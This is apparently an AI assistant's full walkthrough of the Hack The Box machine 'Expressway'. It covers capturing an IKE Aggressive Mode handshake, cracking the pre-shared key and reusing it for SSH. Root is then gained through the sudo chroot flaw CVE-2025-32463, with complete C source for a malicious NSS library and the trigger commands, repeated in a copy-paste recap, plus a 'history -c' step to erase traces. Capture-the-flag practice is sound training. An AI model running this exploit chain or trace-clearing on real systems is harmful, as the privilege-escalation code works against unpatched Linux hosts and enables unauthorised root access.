expressway (htb) – full walkthrough

Target: 10.10.11.87
Attacker: Kali
Goal: user + root

0) quick prep (optional but handy)

Add the host to your /etc/hosts so the domain that leaks later makes sense:

echo "10.10.11.87 expressway.htb" | sudo tee -a /etc/hosts

1) recon – find the interesting service

We already know this is about IKE (UDP/500):

nmap -sU -p 500 -A 10.10.11.87


Result (yours): UDP/500 open, IKEv1, Aggressive Mode traits and XAUTH + Dead Peer Detection. That’s the classic “let’s try to grab the Aggressive Mode handshake and crack the PSK” situation.

2) capture an IKE Aggressive Mode handshake

Use ike-scan to elicit an Aggressive handshake and dump the parameters for cracking.

ike-scan -P -M -A -n fakeID 10.10.11.87


-A Aggressive mode

-n fakeID supplies a dummy ID to trigger a response

-M multiline dump

-P prints crackable fields (you’ll copy them next)

What to save: the long colon-separated line after “IKE PSK parameters”. Put it in a file:

# paste the long "g_xr:...:hash_r" line into psk.txt
nano psk.txt


(Your output showed ID_USER_FQDN = ike@expressway.htb, which is a great hint for the username later.)

3) crack the PSK

Dictionary crack against RockYou:

psk-crack --dictionary /usr/share/wordlists/rockyou.txt psk.txt


Your hit: freakingrockstarontheroad

Verify the PSK works:

ike-scan -A -n ike@expressway.htb --psk=freakingrockstarontheroad 10.10.11.87


You should see another Aggressive Mode handshake returned (you did).

4) extra enum – TFTP config (optional but confirms clues)

A TFTP service exposes a router config that reinforces the ike user/realm:

nmap -sU -p 69 --script tftp-enum 10.10.11.87
# shows ciscortr.cfg
tftp 10.10.11.87 -c get ciscortr.cfg
cat ciscortr.cfg


You saw ciscortr.cfg via NSE. Contents typically hint at the same domain/user and VPN bits.

5) foothold – SSH reuse of the PSK (intended)

Try the leaked identity as a system user with the same password (common HTB trick on this box):

ssh ike@10.10.11.87
# password:
freakingrockstarontheroad


Result (yours): valid shell; grab user.txt:

cat ~/user.txt

6) privilege escalation – vulnerable SUID sudo (“chwoot”)

On the host:

ls -l /usr/local/bin/sudo
/usr/local/bin/sudo -V | head -n1


Your box:

SUID root: /usr/local/bin/sudo

Version: Sudo version 1.9.17

Sudo 1.9.14–1.9.17 has a critical local privesc dubbed “chwoot” (CVE-2025-32463). The bug is in the --chroot (-R) path: when you run sudo with a user-controlled root dir, it consults NSS config from that directory and can be steered to load a malicious NSS library as root, yielding an instant root shell. Fixed in 1.9.17p1. 
Amazon Explore
+2
Upwind
+2

There’s also a related host-check bug, CVE-2025-32462, where sudo -h <host> can bypass host-tied sudoers rules; it was also fixed in 1.9.17p1. We don’t need it here. 
Ubuntu
+1

exploit steps (what you ran)

make a staging dir:

STAGE=$(mktemp -d /tmp/sudowoot.XXXXXX); cd "$STAGE"


write a tiny NSS “library” that just spawns a root shell:

cat > woot1337.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void woot(void){
    setreuid(0,0); setregid(0,0);
    chdir("/"); execl("/bin/bash","bash","-p",NULL);
}
EOF


craft the fake root with a toxic nsswitch.conf and a place for our lib:

mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc   # prevents NSS from crashing


build the shared object:

gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c


No gcc on target? Compile on Kali and upload:

gcc -shared -fPIC -Wl,-init,woot -o woot1337.so.2 woot1337.c
scp woot1337.so.2 ike@10.10.11.87:/tmp/libnss_/woot1337.so.2


(Or base64 it across.)

trigger vulnerable sudo with the chroot option:

/usr/local/bin/sudo -R woot woot


Boom — you’re root (bash -p). Read the flag:

cat /root/root.txt


Why it works: vulnerable sudo (≤1.9.17) honors an attacker-controlled chroot and evaluates NSS from the fake root, loading /libnss_/woot1337.so.2 and executing its constructor as root. Patched in 1.9.17p1. Detections in the wild key off suspicious sudo -R usage with attacker-seeded nsswitch.conf. 
Amazon Explore
+1

7) tidy up (nice to do on HTB)
rm -rf "$STAGE"
history -c

full command recap (copy-paste)
# recon
nmap -sU -p 500 -A 10.10.11.87

# grab IKE Aggressive params
ike-scan -P -M -A -n fakeID 10.10.11.87
nano psk.txt     # paste the long "IKE PSK parameters" line

# crack PSK
psk-crack --dictionary /usr/share/wordlists/rockyou.txt psk.txt

# verify PSK works (optional)
ike-scan -A -n ike@expressway.htb --psk=freakingrockstarontheroad 10.10.11.87

# TFTP enum (optional)
nmap -sU -p69 --script tftp-enum 10.10.11.87
tftp 10.10.11.87 -c get ciscortr.cfg

# shell
ssh ike@10.10.11.87   # password: freakingrockstarontheroad
cat ~/user.txt

# privesc – chwoot (CVE-2025-32463)
ls -l /usr/local/bin/sudo
/usr/local/bin/sudo -V | head -n1

STAGE=$(mktemp -d /tmp/sudowoot.XXXXXX); cd "$STAGE"
cat > woot1337.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void woot(void){
    setreuid(0,0); setregid(0,0);
    chdir("/"); execl("/bin/bash","bash","-p",NULL);
}
EOF
mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

/usr/local/bin/sudo -R woot woot
cat /root/root.txt

references (why we knew this would work)

Official ID and description for CVE-2025-32463 (NSS + --chroot): NVD / vendor trackers; fixed in 1.9.17p1. 
Amazon Explore

Summaries & affected versions for 32462/32463 and the 1.9.17p1 fix window. 
Oligo Security
+1

News/explainers for “chwoot” (sudo -R abuse). 
heise online
+1

Defender detection logic for this exact sudo -R + NSS pattern. 
Elastic

Exploit-db style PoC notes (mirrors the technique you used). 
exploit-db.com

done

You already reproduced everything perfectly (PSK → SSH → chwoot → root). If you want, I can turn this into a Markdown report template with your exact hashes and timestamps baked in.
